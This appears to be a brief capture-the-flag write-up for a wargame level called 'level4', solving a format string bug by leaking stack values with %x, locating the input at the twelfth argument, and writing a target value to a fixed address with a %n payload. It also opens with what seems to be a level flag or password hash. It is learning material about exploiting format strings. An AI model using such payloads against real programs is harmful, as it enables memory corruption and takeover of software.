level4:b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

looks like a format string vuln

```shell
root@81bba73d829e:~# ./level4 
aaaa %x %x %x %x
aaaa f7f198f0 ffb77224 0 f7eea000
```
12th arguments is the text I entered

`0x8049810` must have the value `0x1025544` = `16930116`

payload: `python2 -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > payload`